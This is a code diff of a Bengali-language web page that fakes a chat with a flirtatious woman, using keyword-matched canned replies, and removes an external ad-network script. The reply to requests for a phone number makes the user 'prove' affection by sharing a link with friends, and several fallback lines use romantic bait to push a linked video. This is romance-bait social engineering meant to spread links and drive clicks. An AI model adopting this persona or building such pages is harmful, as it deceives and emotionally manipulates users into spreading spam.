+            if(text.includes('number') || text.includes('নাম্বার') || text.includes('phone') || text.includes('whatsapp')) {
+                return "নাম্বার তো দেবো, কিন্তু তার আগে প্রমাণ করো তুমি আমাকে কতটা চাও। এই লিংকটা বন্ধুদের সাথে শেয়ার করো..." + linkBtn;
+            }
+
+            // Fallback (যদি কোনো কিওয়ার্ড না মিলে)
+            const randoms = [
+                "তোমার কথাগুলো না খুব মিষ্টি! আরও বলো...",
+                "আচ্ছা, একটা সত্যি কথা বলো তো, তুমি কি অন্য মেয়েদের সাথেও এমন করো? 😒",
+                "জানি না কেন, তোমাকে আমার খুব ভালো লাগছে...",
+                "তুমি কি আমাকে একটু আদর করবে? 🥺",
+                "বাবু, আমার না মন ভালো নেই। আমাকে একটা মজার ভিডিও দাও না... অথবা এই ভিডিওটা দেখো..." + linkBtn,
+                "আজকে চাঁদটা খুব সুন্দর, তাই না? একদম তোমার মতো!",
+            ];
+            
+            return randoms[Math.floor(Math.random() * randoms.length)];
         }
+
+        // Enter key support
+        document.getElementById('msgInput').addEventListener('keypress', function (e) { if (e.key === 'Enter') handleUserMessage(); });
     </script>
-
-<script
-  type="text/javascript"
-  src="//pl28030600.effectivegatecpm.com/3a/39/2e/3a392ef12ec9411fdf1fcc8c22f2cc9d.js"
-></script>
-
 </body>
 </html>
